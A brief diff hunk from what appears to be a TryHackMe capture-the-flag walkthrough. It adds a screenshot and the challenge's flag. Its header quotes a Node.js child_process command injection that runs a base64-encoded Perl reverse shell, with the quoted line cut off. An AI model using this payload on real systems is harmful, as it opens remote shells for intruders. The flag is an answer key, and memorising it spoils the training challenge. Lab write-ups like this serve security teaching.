@@ -275,3 +275,8 @@ require('child_process').execSync('echo cGVybCAtZSAndXNlIFNvY2tldDskaT0iMTAuMTcu
 
 ![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/b401e5c5-f1bd-4750-9551-d8c3c51a4630)
 
+![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/a668f60a-5479-4b06-9e11-5ec16665b1e5)
+
+```
+THM{1e15fbe7978061c6bb1924124fd9eab2}
+```
